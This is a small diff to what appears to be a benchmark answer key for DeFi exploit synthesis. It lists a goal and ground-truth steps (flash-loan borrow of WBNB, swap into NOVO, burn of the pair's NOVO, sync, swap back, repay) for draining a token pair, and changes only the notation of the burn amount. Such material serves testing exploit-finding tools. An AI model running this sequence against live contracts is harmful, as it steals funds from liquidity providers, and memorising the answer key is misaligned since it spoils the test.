@@ -29,7 +29,7 @@ attack_goal: "wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker"
 groundtruth:
   - ["borrow", "wbnb", "17e18"]
   - ["swap", "pair", "wbnb", "novo", "wbnb.balanceOf(attacker)"]
-  - ["burn", "pair", "novo", "113951614e9"]
+  - ["burn", "pair", "novo", "0.113951614e18"]
   - ["sync", "pair"]
   - ["swap", "pair", "novo", "wbnb", "novo.balanceOf(attacker)"]
   - ["payback", "wbnb", "17e18 * 1003 / 1000"]
